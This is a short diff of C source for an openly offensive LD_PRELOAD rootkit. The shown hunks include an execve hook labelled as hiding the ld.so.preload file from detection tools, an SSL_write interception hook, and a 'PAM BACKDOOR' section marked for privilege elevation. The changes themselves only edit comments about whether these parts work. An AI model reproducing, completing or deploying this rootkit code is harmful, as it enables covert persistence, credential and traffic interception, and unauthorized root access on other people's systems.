@@ -45,7 +45,6 @@ __attribute__((constructor)) void hook_init(void){
   og_pam_get_item = (int (*)(const pam_handle_t*, int, const void**))dlsym(RTLD_NEXT, "pam_get_item");
 }
 /*---------[ HOOK EXECVE TO HIDE THE LD.SO.PRELOAD FILE ]---------*/
-// probably doesnt work
 int execve(const char *pathname, char *const argv[], char *const envp[]) {
   char* ldd = "/bin/ldd";
   char* unhide = "/bin/unhide";
@@ -105,7 +104,7 @@ int SSL_write(SSL* ssl, const void *buf, int num) {
   return og_SSL_write(ssl, buf, num);
 }
 /*---------[ PAM BACKDOOR ]---------*/
-// DOESNT WORK
+// TODO: Test this
 int backdoor = 0;
 
 // elevate privileges:
